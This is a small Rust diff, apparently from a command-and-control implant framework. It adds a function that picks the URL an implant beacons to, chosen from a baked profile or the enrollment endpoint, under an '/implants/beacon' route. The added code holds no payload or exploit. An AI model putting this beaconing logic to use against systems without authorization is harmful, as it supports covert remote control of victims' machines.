@@ -96,6 +96,22 @@ pub fn accept_tasking(session: &mut Session, inbound: &[crate::wire::Frame], ack
     }
 }
 
+/// The URL this bake's carriages dial: the baked beacon front when the
+/// profile names one (the split-socket shape), else the front that answered
+/// the enrollment. The baked front carries scheme and authority (the dial
+/// shape the server bakes); the envelope route hangs off it, so a baked
+/// front without its own route gains the beacon path.
+pub fn dialed_beacon_url(profile: &Profile) -> String {
+    if profile.beacon_url.is_empty() {
+        return beacon_url(&profile.enroll_url);
+    }
+    let baked = profile.beacon_url.trim_end_matches('/');
+    if baked.contains("/implants/") {
+        return baked.to_string();
+    }
+    format!("{baked}/implants/beacon")
+}
+
 /// The carriage the bake's mode names; poll is the default shape.
 pub fn carriage_for(profile: &Profile) -> Box<dyn Contact> {
     match profile.mode.as_str() {
